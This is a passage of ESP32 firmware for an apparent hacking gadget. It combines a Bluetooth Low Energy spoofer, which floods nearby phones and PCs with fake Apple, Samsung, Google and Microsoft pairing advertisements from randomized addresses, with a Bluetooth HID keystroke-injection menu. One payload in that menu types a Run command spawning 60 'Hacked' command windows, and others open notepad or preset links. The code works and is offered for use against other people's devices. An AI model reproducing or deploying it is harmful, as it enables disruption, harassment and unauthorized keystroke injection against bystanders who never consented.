      case 21: device_index = 0; break; // Pixel Buds Pro
      case 22: device_index = 1; break; // Pixel Buds A
      case 23: device_index = 2; break; // WH-1000XM5
      case 24: device_index = 0; break; // Swift Pair PC
      case 25: device_index = 1; break; // Swift Pair Headset
      // Xiaomi / Redmi (26-35)
      case 26: device_index = 0; break;
      case 27: device_index = 1; break;
      case 28: device_index = 2; break;
      case 29: device_index = 3; break;
      case 30: device_index = 4; break;
      case 31: device_index = 5; break;
      case 32: device_index = 6; break;
      case 33: device_index = 7; break;
      case 34: device_index = 8; break;
      case 35: device_index = 9; break;
      // Motorola (36-40)
      case 36: device_index = 10; break;
      case 37: device_index = 11; break;
      case 38: device_index = 12; break;
      case 39: device_index = 13; break;
      case 40: device_index = 14; break;
      // OnePlus (41-46)
      case 41: device_index = 15; break;
      case 42: device_index = 16; break;
      case 43: device_index = 17; break;
      case 44: device_index = 18; break;
      case 45: device_index = 19; break;
      case 46: device_index = 20; break;
      // Realme (47-50)
      case 47: device_index = 21; break;
      case 48: device_index = 22; break;
      case 49: device_index = 23; break;
      case 50: device_index = 24; break;
      // Oppo (51-53)
      case 51: device_index = 25; break;
      case 52: device_index = 26; break;
      case 53: device_index = 27; break;
      // Vivo (54-55)
      case 54: device_index = 28; break;
      case 55: device_index = 29; break;
      // JBL (56-57)
      case 56: device_index = 30; break;
      case 57: device_index = 31; break;
      // Sony (58-59)
      case 58: device_index = 32; break;
      case 59: device_index = 33; break;
      // Bose (60-61)
      case 60: device_index = 34; break;
      case 61: device_index = 35; break;
      default: Airpods(); break;
    }
  }

  void toggleAdvertising() {
    isAdvertising = !isAdvertising;

    if (!isAdvertising) {
      pAdvertising->stop();
      Serial.println("Advertising stopped.");
    } else {
      esp_bd_addr_t dummy_addr = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
      }
      BLEAdvertisementData oAdvertisementData = getAdvertisementData();
      BLEAdvertisementData scanResponse;
      if (deviceType > 25) {
        scanResponse.setName(androidModels[deviceType - 26].name);
      }
      pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
      pAdvertising->setScanResponseData(scanResponse);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->setMinInterval(0x20); // 32.5ms
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);
      pAdvertising->start();
      Serial.println("Advertising started.");
    }
    updateDisplay();
  }

  void changeDeviceTypeNext() {
    deviceType = (deviceType % deviceCount) + 1;
    Serial.println("Device Type: " + String(deviceNames[deviceType - 1]));
    setAdvertisingData();
    updateDisplay();
  }

  void changeDeviceTypePrev() {
    deviceType = (deviceType - 2 + deviceCount) % deviceCount + 1;
    Serial.println("Device Type: " + String(deviceNames[deviceType - 1]));
    setAdvertisingData();
    updateDisplay();
  }

  void changeAdvTypeNext() {
    advType = (advType % advTypeCount) + 1;
    Serial.println("Adv Type: " + String(advTypes[advType - 1]));
    updateDisplay();
  }

  void changeAdvTypePrev() {
    advType = (advType - 2 + advTypeCount) % advTypeCount + 1;
    Serial.println("Adv Type: " + String(advTypes[advType - 1]));
    updateDisplay();
  }

  void navigateUp() {
    menuIndex = (menuIndex - 1 + menuSize) % menuSize;
    Serial.println("Navigate Up: menuIndex=" + String(menuIndex));
    updateDisplay();
  }

  void navigateDown() {
    menuIndex = (menuIndex + 1) % menuSize;
    Serial.println("Navigate Down: menuIndex=" + String(menuIndex));
    updateDisplay();
  }

  // ─── HID INJECTION ──────────────────────────────────────────────────────────

  BleKeyboard* hidKeyboard = nullptr;

  void hidTypeSlow(const char* text, int charDelay = 40) {
    for (int i = 0; text[i] != '\0'; i++) {
      hidKeyboard->print(String(text[i]));
      delay(charDelay);
    }
  }

  void hidPressWin(char keyChar) {
    hidKeyboard->press(KEY_LEFT_GUI);
    hidKeyboard->press(keyChar);
    delay(100);
    hidKeyboard->releaseAll();
    delay(600);
  }

  void hidDrawMenu(int sel, const char** items, int count) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    u8g2.drawStr(4, 10, "HID Inject");
    u8g2.drawHLine(0, 12, 128);
    for (int i = 0; i < count; i++) {
      int y = 24 + i * 13;
      if (i == sel) {
        u8g2.drawBox(0, y - 9, 128, 11);
        u8g2.setDrawColor(0);
        u8g2.drawStr(4, y, items[i]);
        u8g2.setDrawColor(1);
      } else {
        u8g2.drawStr(4, y, items[i]);
      }
    }
    u8g2.sendBuffer();
  }

  void hidShowStatus(const char* msg) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    u8g2.drawStr(4, 10, "HID Inject");
    u8g2.drawHLine(0, 12, 128);
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawStr(4, 30, msg);
    u8g2.drawStr(4, 44, "Running...");
    u8g2.sendBuffer();
  }

  // ── PC payloads ─────────────────────────────────────────────────────────────

  void hidPC_Hello() {
    hidShowStatus("Hello - Notepad");
    // Open Run → notepad
    hidPressWin('r');
    delay(400);
    hidTypeSlow("notepad");
    hidKeyboard->write(KEY_RETURN);
    delay(1500);
    hidTypeSlow("Hello from ESP32!");
    delay(300);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    u8g2.drawStr(4, 32, "Done!");
    u8g2.sendBuffer();
    delay(1500);
  }

  void hidPC_YouTube() {
    hidShowStatus("YouTube Rickroll");
    hidPressWin('r');
    delay(400);
    hidTypeSlow(""); // add your YouTube video link here
    hidKeyboard->write(KEY_RETURN);
    delay(300);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    u8g2.drawStr(4, 32, "Launched!");
    u8g2.sendBuffer();
    delay(1500);
  }

  void hidPC_FakeCmd() {
    hidShowStatus("Fake CMD Spam");
    hidPressWin('r');
    delay(400);
    // spawn 30 CMD windows via nested start commands
    hidTypeSlow("cmd /c \"for /l %i in (1,1,60) do start cmd /k echo Hacked %i\"");
    hidKeyboard->write(KEY_RETURN);
    delay(300);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    u8g2.drawStr(4, 32, "Launched!");
    u8g2.sendBuffer();
    delay(1500);
  }

  // ── Phone payloads ───────────────────────────────────────────────────────────

  void hidPhone_Instagram() {
    hidShowStatus("Instagram Reel");
    hidPressWin('r');
    delay(400);
    hidTypeSlow(""); // Add your Instagram reel link here
    hidKeyboard->write(KEY_RETURN);
    delay(300);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    u8g2.drawStr(4, 32, "Launched!");
    u8g2.sendBuffer();
    delay(1500);
  }

  // ── Phone YouTube removed - same as hidPC_YouTube ────────────────────────────


  // ── Sub-menus removed - flat menu used instead ───────────────────────────────

  void launchHidMenu() {
    if (hidKeyboard == nullptr) {
      hidKeyboard = new BleKeyboard("ESP32 Keyboard", "ESP32", 100);
      hidKeyboard->begin();
    }

    const char* items[] = {"Youtube", "Instagram", "Notepad", "Cmd spam", "Back"};
    const int count = 5;
    int sel = 0;
    hidDrawMenu(sel, items, count);

    // Wait for BLE connection
    if (!hidKeyboard->isConnected()) {
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_profont11_tf);
      u8g2.drawStr(4, 10, "HID Inject");
      u8g2.drawHLine(0, 12, 128);
      u8g2.setFont(u8g2_font_5x7_tf);
      u8g2.drawStr(4, 30, "Waiting for");
      u8g2.drawStr(4, 42, "BT connection...");
      u8g2.drawStr(4, 56, "LEFT to cancel");
      u8g2.sendBuffer();
      unsigned long lastLeft = 0;
      while (!hidKeyboard->isConnected()) {
        if (digitalRead(BTN_PIN_LEFT) == LOW && millis() - lastLeft > 200) {
          updateDisplay();
          return;
        }
        delay(100);
      }
    }

    hidDrawMenu(sel, items, count);

    unsigned long lastUp = 0, lastDown = 0, lastRight = 0, lastLeft = 0;
    const unsigned long db = 200;

    while (true) {
      if (digitalRead(BUTTON_UP_PIN) == LOW && millis() - lastUp > db) {
        lastUp = millis();
        sel = (sel - 1 + count) % count;
        hidDrawMenu(sel, items, count);
      }
      if (digitalRead(BUTTON_DOWN_PIN) == LOW && millis() - lastDown > db) {
        lastDown = millis();
        sel = (sel + 1) % count;
        hidDrawMenu(sel, items, count);
      }
      if (digitalRead(BTN_PIN_RIGHT) == LOW && millis() - lastRight > db) {
        lastRight = millis();
        if (sel == 0) hidPC_YouTube();
        else if (sel == 1) hidPhone_Instagram();
        else if (sel == 2) hidPC_Hello();
        else if (sel == 3) hidPC_FakeCmd();
        else { updateDisplay(); return; }
        hidDrawMenu(sel, items, count);
      }
      if (digitalRead(BTN_PIN_LEFT) == LOW && millis() - lastLeft > db) {
        lastLeft = millis();
        updateDisplay();
        return;
      }
      delay(30);
    }
  }

  // ─── END HID INJECTION ───────────────────────────────────────────────────────

  void changeOptionRight() {
    if (menuIndex == 0) changeDeviceTypeNext();
    else if (menuIndex == 1) launchHidMenu();
    else if (menuIndex == 2) changeAdvTypeNext();
    else toggleAdvertising();
  }

  void changeOptionLeft() {
    if (menuIndex == 0) changeDeviceTypePrev();
    else if (menuIndex == 1) launchHidMenu();
    else if (menuIndex == 2) changeAdvTypePrev();
    else toggleAdvertising();
  }

  void handleButtonPress(int pin, unsigned long &lastDebounceTime, void (*callback)()) {
    if (digitalRead(pin) == LOW) {
      unsigned long currentTime = millis();
      if ((currentTime - lastDebounceTime) > debounceDelay) {
        Serial.println("Button press: Pin=" + String(pin));
        callback();
        lastDebounceTime = currentTime;
      }
    }
  }

  void spooferSetup() {
    Serial.begin(115200);
    
    randomSeed(analogRead(0));
    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
    pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
    pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_PIN_LEFT, INPUT_PULLUP);

    BLEDevice::init("");
    esp_ble_gap_set_device_name("");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); // +9dBm
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();

    BLEAdvertisementData emptyScanResponse;
    pAdvertising->setScanResponseData(emptyScanResponse);

    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);

    updateDisplay();

    setNeoPixelColour("null");
  }

  void spooferLoop() {
    handleButtonPress(BUTTON_UP_PIN, lastDebounceTimeUp, navigateUp);
    handleButtonPress(BUTTON_DOWN_PIN, lastDebounceTimeDown, navigateDown);
    handleButtonPress(BTN_PIN_RIGHT, lastDebounceTimeRight, changeOptionRight);
    handleButtonPress(BTN_PIN_LEFT, lastDebounceTimeLeft, changeOptionLeft);
    delay(50);

    const char* color = "0";
    
    if (isAdvertising) {
      if (deviceType <= 17) color = "red";       // Apple
      else if (deviceType <= 20) color = "purple"; // Samsung
      else if (deviceType <= 23) color = "green";  // Google Fast Pair
      else if (deviceType <= 25) color = "blue";   // Swift Pair
      else color = "orange";                        // Android (Redmi/Moto/OnePlus etc)
    }
    else if (!isAdvertising){color = "null";}
    
    setNeoPixelColour(color);
  }
}
